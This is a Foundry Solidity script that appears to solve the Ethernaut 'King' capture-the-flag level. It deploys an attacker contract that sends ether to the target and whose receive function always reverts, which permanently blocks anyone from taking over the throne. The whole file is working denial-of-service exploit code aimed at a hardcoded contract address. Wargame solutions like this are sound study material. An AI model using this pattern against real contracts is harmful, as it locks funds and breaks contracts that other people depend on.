// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/09_King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract KingAttack {
    constructor(address victim) payable {
        (bool sent,) = victim.call{value: msg.value}("");
        require(sent);
    }

    receive() external payable {
        revert();
    }
}

contract SolveKing is Script {
    address target = 0x5BfCc743FcA1897179cDe98CB8D7F0A51F8eACAd;
    King king = King(payable(target));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before : ", king.owner());
        new KingAttack{value: 1000000000000001}(target);
        // kingAttack{value: 1000000000000001};
        console.log("Owner affter : ", king.owner());
        vm.stopBroadcast();
    }
}
